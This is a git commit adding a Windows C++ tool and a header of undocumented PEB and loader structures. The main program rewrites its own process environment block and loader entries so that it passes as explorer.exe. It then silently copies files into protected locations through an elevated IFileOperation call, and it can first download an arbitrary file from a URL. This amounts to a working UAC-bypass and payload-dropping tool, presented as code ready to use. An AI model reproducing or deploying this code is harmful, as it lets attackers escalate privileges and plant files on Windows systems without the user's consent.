9d12dd9cab4f52b0d1e5e3caf94b1c012178290d
jacky5112 <qoo24571864@yahoo.com.tw>
2017-03-12 10:21:18 +0800

    first commit

---
+++ main.cpp
@@ -0,0 +1,195 @@
+#include "win_internal.h"
+#include <stdio.h>
+#include <ShlObj.h>
+#include <Windows.h>
+#include <urlmon.h>
+
+#pragma comment (lib, "Urlmon.lib")
+
+#define TARGET_EXE_FILE_PATH							L"C:\\Windows\\explorer.exe"
+#define TARGET_EXE_FILE_NAME							L"explorer.exe"
+
+HRESULT CopyItem(PCWSTR pszSrcItem, PCWSTR pszDest, PCWSTR pszNewName);
+
+int wmain(int argc, wchar_t *argv[])
+{
+	if (argc == 5)
+	{
+		PEB32 *pPEB = 0;
+
+		_asm push fs : [0x30];
+		_asm pop[pPEB];
+
+		/*
+		// Check use
+		fprintf(stdout, "%d\n", (SIZE_T)GetProcessHeap());
+		_asm mov eax, dword ptr fs : [00000030h];
+		_asm mov eax, dword ptr[eax + 18h];
+		SIZE_T check = 0;
+		_asm mov check, eax;
+		fprintf(stdout, "%d\n", check);
+
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->ImagePathName.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CommandLine.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DllPath.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->WindowTitle.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DesktopName.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->RuntimeData.Buffer);
+		fprintf(stdout, "%S\n", ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CurrentDirectoryPath.Buffer);
+		
+		RTL_DRIVE_LETTER_CURDIR check[0x20];
+		memcpy(check, ((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DLCurrentDirectory, sizeof(check));
+		*/
+
+		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->ImagePathName.Buffer = TARGET_EXE_FILE_PATH;
+		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->CommandLine.Buffer = TARGET_EXE_FILE_PATH;
+		((PRTL_USER_PROCESS_PARAMETERS)(pPEB->ProcessParameters))->DllPath.Buffer = TARGET_EXE_FILE_PATH;
+		PLDR_DATA_TABLE_ENTRY k = (PLDR_DATA_TABLE_ENTRY)(((PLDR_DATA_TABLE_ENTRY)(pPEB->Ldr))->InMemoryOrderModuleList.Blink);
+
+		while (true)
+		{
+			if (k->FullDllName.Buffer)
+			{
+				if (wcsstr(k->FullDllName.Buffer, L".exe"))
+				{
+					k->FullDllName.Buffer = TARGET_EXE_FILE_PATH;
+					k->BaseDllName.Buffer = TARGET_EXE_FILE_NAME;
+					break;
+				} // end if
+			} // end if
+
+			k = (PLDR_DATA_TABLE_ENTRY)((LIST_ENTRY*)k)->Flink;
+		} // end while
+
+		if (lstrcmpW(argv[1], L"-p") == 0)
+		{
+			CopyItem(argv[2], argv[3], argv[4]);
+		} // end if
+		else if (lstrcmpW(argv[1], L"-u") == 0)
+		{
+			WCHAR szPath[MAX_PATH];
+			GetCurrentDirectoryW(sizeof(szPath), szPath);
+			lstrcatW(szPath, L"\\");
+			lstrcatW(szPath, argv[4]);
+			HRESULT hr = URLDownloadToFileW(NULL, argv[2], szPath, 0, NULL);
+			
+			if (SUCCEEDED(hr))
+			{
+				CopyItem(argv[2], argv[3], argv[4]);
+			} // end if
+			else
+			{
+				fprintf(stdout, "[-] URLDownloadToFileW Error (%d).\n", GetLastError());
+			} // end else
+		} // end else if
+
+		system("pause");
+		return 0;
+	} // end if
+
+	fprintf(stderr, "<exe_name> -p <src file path> <dst file path> <dst file name>\n");
+	fprintf(stderr, "<exe_name> -u <url> <dst file path> <dst file name>\n");
+
+	system("pause");
+	return -1;
+} // end main
+
+  // Ref. https://msdn.microsoft.com/zh-tw/library/windows/desktop/bb775761(v=vs.85).aspx
+HRESULT CopyItem(PCWSTR pszSrcItem, PCWSTR pszDest, PCWSTR pszNewName)
+{
+	//
+	// Initialize COM as STA.
+	//
+	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
+
+	if (SUCCEEDED(hr))
+	{
+		IFileOperation *pfo;
+
+		//
+		// Create the IFileOperation interface 
+		//
+		hr = CoCreateInstance(CLSID_FileOperation,
+			NULL,
+			CLSCTX_ALL,
+			IID_PPV_ARGS(&pfo));
+
+		if (SUCCEEDED(hr))
+		{
+			//
+			// Set the operation flags. Turn off all UI from being shown to the
+			// user during the operation. This includes error, confirmation,
+			// and progress dialogs.
+			//
+			hr = pfo->SetOperationFlags(FOF_NOCONFIRMMKDIR | FOF_NOERRORUI | FOF_RENAMEONCOLLISION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_REQUIREELEVATION);
+
+			if (SUCCEEDED(hr))
+			{
+				//
+				// Create an IShellItem from the supplied source path.
+				//
+				IShellItem *psiFrom = NULL;
+				hr = SHCreateItemFromParsingName(pszSrcItem,
+					NULL,
+					IID_PPV_ARGS(&psiFrom));
+				if (SUCCEEDED(hr))
+				{
+					IShellItem *psiTo = NULL;
+
+					if (NULL != pszDest)
+					{
+						//
+						// Create an IShellItem from the supplied 
+						// destination path.
+						//
+						hr = SHCreateItemFromParsingName(pszDest,
+							NULL,
+							IID_PPV_ARGS(&psiTo));
+					}
+
+					if (SUCCEEDED(hr))
+					{
+						//
+						// Add the operation
+						//
+						hr = pfo->CopyItem(psiFrom, psiTo, pszNewName, NULL);
+
+						if (NULL != psiTo)
+						{
+							psiTo->Release();
+						}
+					}
+
+					psiFrom->Release();
+				}
+
+				if (SUCCEEDED(hr))
+				{
+					//
+					// Perform the operation to copy the file.
+					//
+					hr = pfo->PerformOperations();
+				}
+			}
+			else
+			{
+				fprintf(stderr, "[-] SetOperationFlags Error (%d).\n", GetLastError());
+			} // end else
+
+			  //
+			  // Release the IFileOperation interface.
+			  //
+			pfo->Release();
+		}
+
+		CoUninitialize();
+	}
+	else
+	{
+		fprintf(stderr, "[-] CoInitializeEx Error (%d).\n", GetLastError());
+	} // end else
+
+	fprintf(stdout, "[+] Copy file sucessfully.\n");
+
+	return hr;
+}
---
+++ win_internal.h
@@ -0,0 +1,198 @@
+#ifndef _WIN_INTERNAL_H_
+#define _WIN_INTERNAL_H_
+
+#include <Windows.h>
+
+typedef struct _UNICODE_STRING {
+	USHORT Length;
+	USHORT MaximumLength;
+	PWSTR  Buffer;
+} UNICODE_STRING;
+typedef UNICODE_STRING *PUNICODE_STRING;
+typedef const UNICODE_STRING *PCUNICODE_STRING;
+
+typedef struct _LDR_DATA_TABLE_ENTRY
+{
+	LIST_ENTRY InLoadOrderLinks;
+	LIST_ENTRY InMemoryOrderModuleList;
+	LIST_ENTRY InInitializationOrderModuleList;
+	PVOID DllBase;
+	PVOID EntryPoint;
+	ULONG SizeOfImage;
+	UNICODE_STRING FullDllName;
+	UNICODE_STRING BaseDllName;
+	ULONG Flags;
+	USHORT LoadCount;
+	USHORT TlsIndex;
+	union
+	{
+		LIST_ENTRY HashLinks;
+		struct
+		{
+			PVOID SectionPointer;
+			ULONG CheckSum;
+		};
+	};
+	union
+	{
+		ULONG TimeDateStamp;
+		PVOID LoadedImports;
+	};
+	PVOID EntryPointActivationContext;
+	PVOID PatchInformation;
+} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+
+typedef struct _RTL_DRIVE_LETTER_CURDIR {
+	USHORT Flags;
+	USHORT Length;
+	ULONG TimeStamp;
+	UNICODE_STRING DosPath;
+} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;
+
+typedef struct _RTL_USER_PROCESS_PARAMETERS {
+	ULONG MaximumLength;
+	ULONG Length;
+	ULONG Flags;
+	ULONG DebufFlags;
+	PVOID ConsoleHandle;
+	ULONG ConsoleFlags;
+	HANDLE StdInputHandle;
+	HANDLE StdOutputHandle;
+	HANDLE StdErrorHandle;
+	UNICODE_STRING CurrentDirectoryPath;
+	HANDLE CurrentDirectoryHandle;
+	UNICODE_STRING DllPath;
+	UNICODE_STRING ImagePathName;
+	UNICODE_STRING CommandLine;
+	PVOID Environment;
+	ULONG StartingPositionLeft;
+	ULONG StartingPositionTop;
+	ULONG Width;
+	ULONG Height;
+	ULONG CharWidth;
+	ULONG CharHeight;
+	ULONG ConsoleTextAttributes;
+	ULONG WindowFlags;
+	ULONG ShowWindowFlags;
+	UNICODE_STRING WindowTitle;
+	UNICODE_STRING DesktopName;
+	UNICODE_STRING ShellInfo;
+	UNICODE_STRING RuntimeData;
+	RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
+} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
+
+template <class T>
+struct LIST_ENTRY_T
+{
+	T Flink;
+	T Blink;
+};
+
+template <class T>
+struct UNICODE_STRING_T
+{
+	union
+	{
+		struct
+		{
+			WORD Length;
+			WORD MaximumLength;
+		};
+		T dummy;
+	};
+	T _Buffer;
+};
+
+template <class T, class NGF, int A>
+struct _PEB_T
+{
+	union
+	{
+		struct
+		{
+			BYTE InheritedAddressSpace;
+			BYTE ReadImageFileExecOptions;
+			BYTE BeingDebugged;
+			BYTE _SYSTEM_DEPENDENT_01;
+		};
+		T dummy01;
+	};
+	T Mutant;
+	T ImageBaseAddress;
+	T Ldr;
+	T ProcessParameters;
+	T SubSystemData;
+	T ProcessHeap;
+	T FastPebLock;
+	T _SYSTEM_DEPENDENT_02;
+	T _SYSTEM_DEPENDENT_03;
+	T _SYSTEM_DEPENDENT_04;
+	union
+	{
+		T KernelCallbackTable;
+		T UserSharedInfoPtr;
+	};
+	DWORD SystemReserved;
+	DWORD _SYSTEM_DEPENDENT_05;
+	T _SYSTEM_DEPENDENT_06;
+	T TlsExpansionCounter;
+	T TlsBitmap;
+	DWORD TlsBitmapBits[2];
+	T ReadOnlySharedMemoryBase;
+	T _SYSTEM_DEPENDENT_07;
+	T ReadOnlyStaticServerData;
+	T AnsiCodePageData;
+	T OemCodePageData;
+	T UnicodeCaseTableData;
+	DWORD NumberOfProcessors;
+	union
+	{
+		DWORD NtGlobalFlag;
+		NGF dummy02;
+	};
+	LARGE_INTEGER CriticalSectionTimeout;
+	T HeapSegmentReserve;
+	T HeapSegmentCommit;
+	T HeapDeCommitTotalFreeThreshold;
+	T HeapDeCommitFreeBlockThreshold;
+	DWORD NumberOfHeaps;
+	DWORD MaximumNumberOfHeaps;
+	T ProcessHeaps;
+	T GdiSharedHandleTable;
+	T ProcessStarterHelper;
+	T GdiDCAttributeList;
+	T LoaderLock;
+	DWORD OSMajorVersion;
+	DWORD OSMinorVersion;
+	WORD OSBuildNumber;
+	WORD OSCSDVersion;
+	DWORD OSPlatformId;
+	DWORD ImageSubsystem;
+	DWORD ImageSubsystemMajorVersion;
+	T ImageSubsystemMinorVersion;
+	union
+	{
+		T ImageProcessAffinityMask;
+		T ActiveProcessAffinityMask;
+	};
+	T GdiHandleBuffer[A];
+	T PostProcessInitRoutine;
+	T TlsExpansionBitmap;
+	DWORD TlsExpansionBitmapBits[32];
+	T SessionId;
+	ULARGE_INTEGER AppCompatFlags;
+	ULARGE_INTEGER AppCompatFlagsUser;
+	T pShimData;
+	T AppCompatInfo;
+	UNICODE_STRING_T<T> CSDVersion;
+	T ActivationContextData;
+	T ProcessAssemblyStorageMap;
+	T SystemDefaultActivationContextData;
+	T SystemAssemblyStorageMap;
+	T MinimumStackCommit;
+};
+
+typedef _PEB_T<DWORD, DWORD64, 34> PEB32;
+typedef _PEB_T<DWORD64, DWORD, 30> PEB64;
+
+#endif // end #ifndef _WIN_INTERNAL_H_
